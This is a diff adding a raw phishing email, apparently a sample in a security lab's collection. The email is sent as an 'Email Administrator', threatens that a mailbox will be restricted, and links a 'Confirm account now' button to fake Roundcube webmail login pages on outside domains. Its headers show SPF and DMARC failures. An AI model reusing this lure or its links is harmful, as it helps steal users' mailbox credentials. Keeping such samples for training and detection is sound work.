@@ -1,0 +1,233 @@
+Return-Path: <MAILER-DAEMON>
+Delivered-To: hallgato@itseclabs.local
+Received: from localhost (mail.itseclabs.local [127.0.0.1])
+	by gw.itseclabs.local (Postfix) with ESMTP id 1667C86C26
+	for <hallgato@itseclabs.local>; Wed,  6 May 2020 12:42:51 +0000 (UTC)
+X-Virus-Scanned: Debian amavisd-new at gw.itseclabs.local
+Authentication-Results: mail.itseclabs.local (amavisd-new);
+	dkim=pass (1024-bit key) header.d=uctionhub.co.uk
+Received: from gw.itseclabs.local ([127.0.0.1])
+	by localhost (mail.itseclabs.local [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id eeUyIjX0_Ny1 for <hallgato@itseclabs.local>;
+	Wed,  6 May 2020 12:42:49 +0000 (UTC)
+Received: from mail.itseclabs.local (mail.itseclabs.local [193.6.200.101])
+	by gw.itseclabs.local (Postfix) with ESMTPS id C339F86E58
+	for <hallgato@itseclabs.local>; Wed,  6 May 2020 12:42:49 +0000 (UTC)
+Received: by mail.itseclabs.local (Postfix, from userid 1208)
+	id A29CD2A04FA; Wed,  6 May 2020 14:42:49 +0200 (CEST)
+Authentication-Results: mail.itseclabs.local;
+	dkim=pass (1024-bit key; unprotected) header.d=uctionhub.co.uk header.i=dipak@uctionhub.co.uk header.b="Zb6Fs6h5";
+	dkim-atps=neutral
+X-Original-To: hallgato@itseclabs.local
+Delivered-To: hallgato@itseclabs.local
+Received: from localhost (localhost.localdomain [127.0.0.1])
+	by mail.itseclabs.local (Postfix) with ESMTP id 510C92A035B;
+	Wed,  6 May 2020 14:42:49 +0200 (CEST)
+X-Virus-Scanned: Debian amavisd-new at itseclabs.local
+Authentication-Results: itseclabs.local (amavisd-new);
+	dkim=pass (1024-bit key) header.d=uctionhub.co.uk
+Received: from mail.itseclabs.local ([127.0.0.1])
+	by localhost (itseclabs.local [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id o9dmVZV1VNJb; Wed,  6 May 2020 14:42:46 +0200 (CEST)
+Received: from duflex.itseclabs.local (duflex.itseclabs.local [195.70.56.227])
+	(using TLSv1.2 with cipher ADH-AES256-GCM-SHA384 (256/256 bits))
+	(No client certificate requested)
+	by mail.itseclabs.local (Postfix) with ESMTPS id 8B0962A03B3;
+	Wed,  6 May 2020 14:42:46 +0200 (CEST)
+Authentication-Results: OpenDMARC; dmarc=fail (p=none dis=none) header.from=uctionhub.co.uk
+Authentication-Results: OpenDMARC; spf=fail smtp.mailfrom=dipak@uctionhub.co.uk
+Received: by duflex.itseclabs.local (Postfix)
+	id 67F742008F; Wed,  6 May 2020 14:42:46 +0200 (CEST)
+Delivered-To: info@itseclabs.local
+Received: from localhost (localhost [127.0.0.1])
+	by duflex.itseclabs.local (Postfix) with ESMTP id 548E920095
+	for <info@itseclabs.local>; Wed,  6 May 2020 14:42:46 +0200 (CEST)
+X-Virus-Scanned: Debian amavisd-new at duflex.itseclabs.local
+Received: from duflex.itseclabs.local ([127.0.0.1])
+	by localhost (duflex-2.itseclabs.local [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id ZEh5vj5j9r4d for <info@itseclabs.local>;
+	Wed,  6 May 2020 14:42:45 +0200 (CEST)
+X-Greylist: delayed 604 seconds by postgrey-1.36 at duflex-2; Wed, 06 May 2020 14:42:44 CEST
+Authentication-Results: duflex.itseclabs.local;
+	dkim=pass (1024-bit key; unprotected) header.d=uctionhub.co.uk header.i=dipak@uctionhub.co.uk header.b="Zb6Fs6h5";
+	dkim-atps=neutral
+Received: from mail0.uctionhub.co.uk (mail0.uctionhub.co.uk [104.168.165.226])
+	by duflex.itseclabs.local (Postfix) with ESMTPS id 809872008F
+	for <info@itseclabs.local>; Wed,  6 May 2020 14:42:44 +0200 (CEST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=uctionhub.co.uk;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
+ Content-Transfer-Encoding; i=dipak@uctionhub.co.uk;
+ bh=nlXFZ/2jssmAvnFTz1ugh+9adv60n+ZeGQ/7vh/kn5A=;
+ b=Zb6Fs6h5O4ZzkDR0Fk0+2Px/AFk2kWxetjFUSUX7S0r6c1dKL402++5djdAr2EvAKVccH6DOgpYg
+   c1UjWoS0HXkpSUP55OZSXsiUuS30F52gdN/240onQCJu8DbBhglgulH4LmEg0bmCIo5sKX/XXZ4F
+   AqaFoZD0QBlKI925aec=
+From: Email Administrator <dipak@uctionhub.co.uk>
+To: info@itseclabs.local
+Subject: Important: info@itseclabs.local Have Pending Incoming Emails.
+Date: 06 May 2020 12:32:33 +0000
+Message-ID: <20200506123233.9C4F7D330AE0EF52@uctionhub.co.uk>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19678"></HEAD>
+<BODY>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Helvetica, Arial, sans-serif; WHI=
+TE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400=
+; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial"><SPAN style=3D"VERTICAL-ALIGN: inherit"=
+><SPAN style=3D"VERTICAL-ALIGN: inherit">
+Hi&nbsp; info,<BR><BR></SPAN></SPAN></P>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Helvetica, Arial, sans-serif; WHI=
+TE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400=
+; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial"><SPAN style=3D"VERTICAL-ALIGN: inherit"=
+><SPAN style=3D"VERTICAL-ALIGN: inherit">
+You have pending incoming emails that you are yet to receive.</SPAN></SPAN>=
+<BR><BR></P>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Helvetica, Arial, sans-serif; WHI=
+TE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400=
+; COLOR: rgb(0,0,0); PADDING-BOTTOM: 10px; FONT-STYLE: normal; ORPHANS: 2; =
+WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures=
+: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-d=
+ecoration-style: initial; text-decoration-color: initial"><SPAN style=3D"VE=
+RTICAL-ALIGN: inherit">
+<SPAN style=3D"VERTICAL-ALIGN: inherit">Access to&nbsp;info@itseclabs.local</SPAN></=
+SPAN>&nbsp;<SPAN style=3D"VERTICAL-ALIGN: inherit"><SPAN style=3D"VERTICAL-=
+ALIGN: inherit">will be restricted until you confirm ownership.<BR><BR><BR>=
+</SPAN></SPAN></P>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Helvetica, Arial, sans-serif; WHI=
+TE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400=
+; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial">
+<A onclick=3D"parent.phx.event.mailUrlClicked('http:\/\/massafinna.com.br\/=
+cgi-bin\/bin\/i\/roundcube\/webmail\/index.php?email=3Ddwight.cook@sticsa.c=
+om.gt'); return true;" style=3D"HEIGHT: 39px; WIDTH: 146px; COLOR: white; P=
+ADDING-BOTTOM: 10px; PADDING-TOP: 10px; PADDING-LEFT: 10px; PADDING-RIGHT: =
+10px; BACKGROUND-COLOR: rgb(70,139,252)" href=3D"https://alojamientowebboli=
+via.com/cgi-bin/bin/app/roundcube/webmail/index.php?email=3Dinfo@itseclabs.local" ta=
+rget=3D_blank><SPAN style=3D"VERTICAL-ALIGN: inherit">
+<SPAN style=3D"VERTICAL-ALIGN: inherit">Confirm account now</SPAN></SPAN></=
+A><BR><BR></P>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Helvetica, Arial, sans-serif; WHI=
+TE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400=
+; COLOR: rgb(0,0,0); FONT-STYLE: normal; PADDING-TOP: 10px; ORPHANS: 2; WID=
+OWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: n=
+ormal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-deco=
+ration-style: initial; text-decoration-color: initial"><STRONG><SPAN style=
+=3D"VERTICAL-ALIGN: inherit">
+<SPAN style=3D"VERTICAL-ALIGN: inherit"><BR>Note:</SPAN></SPAN></STRONG>&nb=
+sp;<SPAN style=3D"VERTICAL-ALIGN: inherit"><SPAN style=3D"VERTICAL-ALIGN: i=
+nherit">&nbsp;Access to&nbsp;&nbsp;info@itseclabs.local</SPAN></SPAN><SPAN style=3D"=
+VERTICAL-ALIGN: inherit">&nbsp;<SPAN style=3D"VERTICAL-ALIGN: inherit">&nbs=
+p;will be restricted within 48 (forty eight) working hours.<BR></SPAN></SPA=
+N></P>
+<P style=3D"FONT-SIZE: 12px; FONT-FAMILY: Helvetica, Arial, sans-serif; WHI=
+TE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400=
+; COLOR: rgb(0,0,0); FONT-STYLE: normal; PADDING-TOP: 10px; ORPHANS: 2; WID=
+OWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: n=
+ormal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-deco=
+ration-style: initial; text-decoration-color: initial"><SPAN style=3D"VERTI=
+CAL-ALIGN: inherit">
+<SPAN style=3D"VERTICAL-ALIGN: inherit">Regards<BR></SPAN></SPAN></P>
+<DIV style=3D'FONT-SIZE: 11px; FONT-FAMILY: "Lucida Grande", Verdana, Arial=
+, Helvetica, sans-serif; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANS=
+FORM: none; FONT-WEIGHT: 400; COLOR: rgb(51,51,51); FONT-STYLE: normal; PAD=
+DING-TOP: 0px; MARGIN: 0.5em; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal=
+; BORDER-TOP-WIDTH: 0px; TEXT-INDENT: 0px; font-variant-ligatures: normal; =
+font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-=
+style: initial; text-decoration-color: initial'>
+<SPAN style=3D"VERTICAL-ALIGN: inherit"><SPAN style=3D"VERTICAL-ALIGN: inhe=
+rit">
+<DIV id=3Dgmail-m_4486289249338100495gmail-m_7360533328128327680gmail-m_881=
+6819481506201535x_x_x_x_x_x_x_x_x_x_gmail-m_546351434367222813m_46307253337=
+79835265m_-1829515746504207056gmail-m_8350530753403284870m_4568089643873630=
+151m_2521631356735830384gmail-yiv5090206667yui_3_16_0_ym19_1_1510238690535_=
+5652 style=3D'FONT-SIZE: 16px; FONT-FAMILY: Calibri, Helvetica, sans-serif,=
+ EmojiFont, "Apple Color Emoji", "Segoe UI Emoji", NotoColorEmoji, "Segoe U=
+I Symbol", "Android Emoji", EmojiSymbols; COLOR:=20
+rgb(0,0,0)' align=3Dcenter><BR>
+<TABLE id=3Dgmail-m_4486289249338100495gmail-m_7360533328128327680gmail-m_8=
+816819481506201535x_x_x_x_x_x_x_x_x_x_gmail-m_546351434367222813m_463072533=
+3779835265m_-1829515746504207056gmail-m_8350530753403284870m_45680896438736=
+30151m_2521631356735830384gmail-yiv5090206667yui_3_16_0_ym19_1_151023869053=
+5_5651 align=3Dcenter>
+<TBODY id=3Dgmail-m_4486289249338100495gmail-m_7360533328128327680gmail-m_8=
+816819481506201535x_x_x_x_x_x_x_x_x_x_gmail-m_546351434367222813m_463072533=
+3779835265m_-1829515746504207056gmail-m_8350530753403284870m_45680896438736=
+30151m_2521631356735830384gmail-yiv5090206667yui_3_16_0_ym19_1_151023869053=
+5_5650>
+<TR id=3Dgmail-m_4486289249338100495gmail-m_7360533328128327680gmail-m_8816=
+819481506201535x_x_x_x_x_x_x_x_x_x_gmail-m_546351434367222813m_463072533377=
+9835265m_-1829515746504207056gmail-m_8350530753403284870m_45680896438736301=
+51m_2521631356735830384gmail-yui_3_16_0_ym19_1_1510254068386_14848>
+<TD id=3Dgmail-m_4486289249338100495gmail-m_7360533328128327680gmail-m_8816=
+819481506201535x_x_x_x_x_x_x_x_x_x_gmail-m_546351434367222813m_463072533377=
+9835265m_-1829515746504207056gmail-m_8350530753403284870m_45680896438736301=
+51m_2521631356735830384gmail-yui_3_16_0_ym19_1_1510254068386_14847 style=3D=
+"FONT-SIZE: 14px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px;=
+ PADDING-RIGHT: 0px">
+<DIV id=3Dgmail-m_4486289249338100495gmail-m_7360533328128327680gmail-m_881=
+6819481506201535x_x_x_x_x_x_x_x_x_x_gmail-m_546351434367222813m_46307253337=
+79835265m_-1829515746504207056gmail-m_8350530753403284870m_4568089643873630=
+151m_2521631356735830384gmail-yui_3_16_0_ym19_1_1510254068386_14846 style=
+=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADDING-RIGHT=
+: 0px" align=3Dcenter><SPAN style=3D"FONT-SIZE: 12pt"><FONT color=3D#008080=
+>itseclabs.local Admin&nbsp;!</FONT></SPAN><SPAN>&nbsp;</SPAN>
+ <SPAN>&nbsp;</SPAN><SPAN style=3D"FONT-SIZE: 12pt; COLOR: rgb(69,69,69)">&=
+nbsp;</SPAN><SPAN style=3D"FONT-SIZE: 12pt; COLOR: rgb(69,69,69)">&nbsp;&co=
+py;2020</SPAN><SPAN style=3D"FONT-SIZE: 12pt; COLOR: rgb(69,69,69)">&nbsp;A=
+ll Rights Reserved</SPAN></DIV></TD></TR></TBODY></TABLE>
+<DIV id=3Dgmail-m_4486289249338100495gmail-m_7360533328128327680gmail-m_881=
+6819481506201535x_x_x_x_x_x_x_x_x_x_gmail-m_546351434367222813m_46307253337=
+79835265m_-1829515746504207056gmail-m_8350530753403284870m_4568089643873630=
+151m_2521631356735830384gmail-yui_3_16_0_ym19_1_1510254068386_14889 align=
+=3Dcenter>
+<FONT id=3Dgmail-m_4486289249338100495gmail-m_7360533328128327680gmail-m_88=
+16819481506201535x_x_x_x_x_x_x_x_x_x_gmail-m_546351434367222813m_4630725333=
+779835265m_-1829515746504207056gmail-m_8350530753403284870m_456808964387363=
+0151m_2521631356735830384gmail-yui_3_16_0_ym19_1_1510254068386_14896 color=
+=3D#000000>
+<FONT id=3Dgmail-m_4486289249338100495gmail-m_7360533328128327680gmail-m_88=
+16819481506201535x_x_x_x_x_x_x_x_x_x_gmail-m_546351434367222813m_4630725333=
+779835265m_-1829515746504207056gmail-m_8350530753403284870m_456808964387363=
+0151m_2521631356735830384gmail-yui_3_16_0_ym19_1_1510254068386_14915 size=
+=3D1 face=3DCalibri>This email was generated</FONT><FONT size=3D1 face=3DCa=
+libri>&nbsp;</FONT><SPAN>&nbsp;</SPAN><SPAN>&nbsp;</SPAN>
+ <FONT id=3Dgmail-m_4486289249338100495gmail-m_7360533328128327680gmail-m_8=
+816819481506201535x_x_x_x_x_x_x_x_x_x_gmail-m_546351434367222813m_463072533=
+3779835265m_-1829515746504207056gmail-m_8350530753403284870m_45680896438736=
+30151m_2521631356735830384gmail-yui_3_16_0_ym19_1_1510254068386_14895 face=
+=3DCalibri>
+<FONT id=3Dgmail-m_4486289249338100495gmail-m_7360533328128327680gmail-m_88=
+16819481506201535x_x_x_x_x_x_x_x_x_x_gmail-m_546351434367222813m_4630725333=
+779835265m_-1829515746504207056gmail-m_8350530753403284870m_456808964387363=
+0151m_2521631356735830384gmail-yui_3_16_0_ym19_1_1510254068386_14897 size=
+=3D1>with reference no.</FONT><SPAN>&nbsp;</SPAN><SPAN>&nbsp;</SPAN>
+ &nbsp;<FONT id=3Dgmail-m_4486289249338100495gmail-m_7360533328128327680gma=
+il-m_8816819481506201535x_x_x_x_x_x_x_x_x_x_gmail-m_546351434367222813m_463=
+0725333779835265m_-1829515746504207056gmail-m_8350530753403284870m_45680896=
+43873630151m_2521631356735830384gmail-yui_3_16_0_ym19_1_1510254068386_14894=
+ size=3D1>&nbsp;57062210</FONT></FONT></FONT></DIV></DIV>
+<DIV id=3Dgmail-m_4486289249338100495gmail-m_7360533328128327680gmail-m_881=
+6819481506201535x_x_x_x_x_x_x_x_x_x_gmail-m_546351434367222813m_46307253337=
+79835265m_-1829515746504207056gmail-m_8350530753403284870m_4568089643873630=
+151m_2521631356735830384gmail-yui_3_16_0_ym19_1_1510254068386_14888 style=
+=3D'FONT-SIZE: 16px; FONT-FAMILY: Calibri, Helvetica, sans-serif, EmojiFont=
+, "Apple Color Emoji", "Segoe UI Emoji", NotoColorEmoji, "Segoe UI Symbol",=
+ "Android Emoji", EmojiSymbols; COLOR: rgb(0,0,0)'=20
+align=3Dcenter>&nbsp;<FONT id=3Dgmail-m_4486289249338100495gmail-m_73605333=
+28128327680gmail-m_8816819481506201535x_x_x_x_x_x_x_x_x_x_gmail-m_546351434=
+367222813m_4630725333779835265m_-1829515746504207056gmail-m_835053075340328=
+4870m_4568089643873630151m_2521631356735830384gmail-yui_3_16_0_ym19_1_15102=
+54068386_14913 style=3D"FONT-SIZE: x-small" color=3D#008080 size=3D2>This i=
+s an automated message replies cannot be answered</FONT></DIV></SPAN></SPAN=
+></DIV></BODY></HTML>
